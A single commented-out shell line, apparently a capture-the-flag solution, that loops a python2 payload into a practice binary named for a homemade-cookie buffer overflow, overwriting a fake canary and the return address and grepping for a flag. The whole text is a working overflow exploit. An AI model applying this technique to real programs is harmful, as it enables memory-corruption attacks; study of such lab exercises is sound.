#while true; do python2 -c 'print "a"*16 + "\x30\x00\x00\x00" + "a"*12 + "\x7b\x85\x04\x08"'|./Bufferoverflow-homemade-cookie-v3 | grep KMA; done
